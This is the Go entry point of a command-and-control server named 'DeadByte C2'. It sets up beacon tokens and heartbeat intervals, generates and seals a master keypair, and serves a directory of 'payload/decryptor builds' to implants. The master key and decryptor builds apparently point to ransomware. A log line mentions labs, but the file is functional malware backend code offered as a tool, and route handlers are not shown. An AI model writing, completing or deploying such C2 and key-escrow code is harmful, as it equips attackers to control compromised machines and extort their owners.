// DeadByte C2: command & control server with web panel.
package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"

	"deadbyte/internal/crypto"
	"deadbyte/internal/store"
)

var (
	flagListen    = flag.String("listen", "127.0.0.1:8443", "listen address")
	flagDB        = flag.String("db", "deadbyte.db", "database path")
	flagAdminTok  = flag.String("admin-token", "", "panel admin token (random if empty)")
	flagBeaconTok = flag.String("beacon-token", "", "shared beacon token (empty = accept any)")
	flagBeaconInt = flag.Int("beacon-interval", 120, "default heartbeat interval in seconds")
	flagMasterSec = flag.String("master-secret", os.Getenv("DEADBYTE_MASTER_SECRET"), "passphrase that seals the master key at rest")
	flagGen       = flag.Bool("gen", false, "generate the master keypair (if missing) and print the public key")
	flagGenForce  = flag.Bool("gen-force", false, "rotate the master keypair and print the new public key")
	flagTLSCert   = flag.String("tls-cert", "", "TLS certificate file")
	flagTLSKey    = flag.String("tls-key", "", "TLS key file")
	flagDist      = flag.String("dist", "dist", "directory with payload/decryptor builds to serve")
	flagVerbose   = flag.Bool("verbose", false, "verbose request logging")
)

type server struct {
	st             *store.Store
	beacon         string
	admin          string
	masterSecret   string
	beaconInterval int
	verbose        bool
	dist           string
}

func main() {
	flag.Parse()
	log.SetFlags(log.LstdFlags)

	adminTok := *flagAdminTok
	if adminTok == "" {
		b := make([]byte, 12)
		if _, err := rand.Read(b); err != nil {
			log.Fatal(err)
		}
		adminTok = hex.EncodeToString(b)
		log.Printf("admin token (use on the panel): %s", adminTok)
	}
	if err := os.Setenv("DEADBYTE_ADMIN_TOKEN", adminTok); err != nil {
		log.Fatal(err)
	}

	secret := *flagMasterSec
	if secret == "" {
		secret = "deadbyte-dev-secret"
		log.Printf("WARNING: using default master secret; set DEADBYTE_MASTER_SECRET in production labs")
	}

	st, err := store.Open(*flagDB)
	if err != nil {
		log.Fatalf("db: %v", err)
	}
	defer st.Close()

	if *flagGenForce {
		if _, err := genAndStore(st, secret); err != nil {
			log.Fatalf("gen: %v", err)
		}
		log.Printf("master keypair rotated; public key stored")
		return
	}
	if *flagGen {
		pub, err := ensureKeypair(st, secret)
		if err != nil {
			log.Fatalf("gen: %v", err)
		}
		fmt.Println(pub)
		return
	}
	if _, err := ensureKeypair(st, secret); err != nil {
		log.Fatalf("keys: %v", err)
	}

	srv := &server{st: st, beacon: *flagBeaconTok, admin: adminTok, masterSecret: secret, beaconInterval: *flagBeaconInt, verbose: *flagVerbose, dist: *flagDist}
	mux := srv.routes()

	log.Printf("DeadByte C2 listening on %s (db=%s)", *flagListen, *flagDB)
	if *flagTLSCert != "" && *flagTLSKey != "" {
		log.Fatal(http.ListenAndServeTLS(*flagListen, *flagTLSCert, *flagTLSKey, mux))
	}
	log.Fatal(http.ListenAndServe(*flagListen, mux))
}

func ensureKeypair(st *store.Store, secret string) (string, error) {
	pub, err := st.GetMeta("master_pub_b64")
	if err == nil && pub != "" {
		return pub, nil
	}
	return genAndStore(st, secret)
}

func genAndStore(st *store.Store, secret string) (string, error) {
	priv, pub, err := crypto.NewKeypair()
	if err != nil {
		return "", err
	}
	sealed, err := crypto.SealMasterKey(priv.Bytes(), secret)
	if err != nil {
		return "", err
	}
	pubB64 := crypto.PubToB64(pub)
	if err := st.SetMeta("master_pub_b64", pubB64); err != nil {
		return "", err
	}
	if err := st.SetMeta("master_priv_sealed", string(sealed)); err != nil {
		return "", err
	}
	log.Printf("master keypair generated (public: %s)", pubB64)
	return pubB64, nil
}
